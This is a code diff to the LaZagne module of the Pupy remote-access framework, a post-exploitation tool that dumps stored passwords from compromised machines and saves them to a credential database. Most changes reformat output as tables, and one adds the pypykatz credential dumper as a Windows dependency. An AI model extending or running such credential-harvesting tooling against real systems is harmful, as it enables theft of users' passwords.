@@ -2,8 +2,8 @@
 # Author: AlessandroZ
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
+from pupylib.PupyOutput import Color, Table, NewLine
 from pupylib.utils.credentials import Credentials
-from pupylib.utils.term import colorize, terminal_size
 from pupylib.utils.rpyc_utils import obtain
 
 __class_name__="LaZagne"
@@ -24,7 +24,7 @@ class LaZagne(PupyModule):
             'secretstorage', 'crypt'
         ],
         'windows': [
-            'sqlite3.dll'
+            'sqlite3.dll', 'pypykatz'
         ],
     }
 
@@ -40,7 +40,7 @@ class LaZagne(PupyModule):
     }
 
     NON_TABLE = set([
-        'Ssh', 'Secretstorage'
+        'Ssh', 'Secretstorage', 'Libsecret'
     ])
 
     FILTER_COLUMNS = set([
@@ -86,7 +86,7 @@ class LaZagne(PupyModule):
                 if type(user) == str:
                     user = user.decode('utf-8', errors='replace')
 
-                self.log(colorize(u'\n########## User: {} ##########'.format(user), 'yellow'))
+                self.log(Color(u'\n########## User: {} ##########'.format(user), 'yellow'))
 
             elif r[2]:
                 passwordsFound = True
@@ -105,11 +105,8 @@ class LaZagne(PupyModule):
             pass
 
     def print_module_title(self, module):
-        self.log(colorize(
-            '\n------------------- {} -------------------\n'.format(
-                module.encode('utf-8', errors='replace')
-            ), 'yellow'
-        ))
+        self.log(Color(u'------------------- {} -------------------'.format(module), 'yellow'))
+        self.log(NewLine())
 
     # print hex value
     def dump(self, src, length=8):
@@ -182,7 +179,7 @@ class LaZagne(PupyModule):
                 }
 
                 for c in cred.keys():
-                    result[c] = self.try_utf8(cred[c]).strip()
+                    result[c] = cred[c].strip()
 
                     for t, name in self.TYPESMAP.iteritems():
                         if t in set(x.lower() for x in result):
@@ -195,6 +192,17 @@ class LaZagne(PupyModule):
 
         return results
 
+    def prepare_fields(self, items, remove=[]):
+        if not items:
+            return []
+
+        return [
+            {
+                self.try_utf8(k):self.try_utf8(v)
+                for k,v in item.iteritems() if k not in remove
+            } for item in items
+        ]
+
     def try_utf8(self, value):
         if type(value) == unicode:
             try:
@@ -203,45 +211,6 @@ class LaZagne(PupyModule):
                 return value.encode('latin1', errors='ignore')
         else:
             return str(value)
-
-    def prepare_fields(self, items, remove=[]):
-        if not items:
-            return []
-
-        items = [
-            {
-                k:self.try_utf8(v) for k,v in item.iteritems() if k not in remove
-            } for item in items
-        ]
-
-        keys = set()
-        for item in items:
-            for k in item:
-                keys.add(k)
-
-        colinfo = {
-            k:max([
-                len(item.get(k, '')) for item in items
-            ]) for k in keys
-        }
-
-        width, _ = terminal_size()
-
-        truncate = None
-
-        maxlen = sum(colinfo.values()) + len(colinfo)*2
-
-        if maxlen > width:
-            truncate = max(colinfo.keys(), key=lambda k: colinfo[k])
-            maxsize = colinfo[truncate] - (maxlen - width)
-
-        return [
-            {
-                k:(
-                    item.get(k, '')[:maxsize] if k == truncate else item.get(k, '')
-                ).strip() for k in keys
-            } for item in items
-        ]
 
     def filter_same(self, creds):
         return [
@@ -277,17 +246,17 @@ class LaZagne(PupyModule):
             if module not in self.NON_TABLE:
                 self.table(
                     self.prepare_fields(
-                        creds, remove=self.FILTER_COLUMNS
-                    ))
+                        creds, remove=self.FILTER_COLUMNS))
             else:
                 for cred in creds:
-                    for k, v in cred.iteritems():
-                        if k in self.FILTER_COLUMNS:
-                            continue
-                        self.log(u'{}: {}'.format(k, v))
-                    self.log('')
+                    self.table([
+                        {
+                            'KEY':self.try_utf8(k),
+                            'VALUE':self.try_utf8(v)
+                        } for k,v in cred.iteritems() if k not in self.FILTER_COLUMNS
+                    ], ['KEY', 'VALUE'], truncate=True, legend=False, vspace=1)
 
             try:
                 db.add(creds)
             except Exception, e:
-                self.error(u'{}: {}'.format(e))
+                self.error(e)
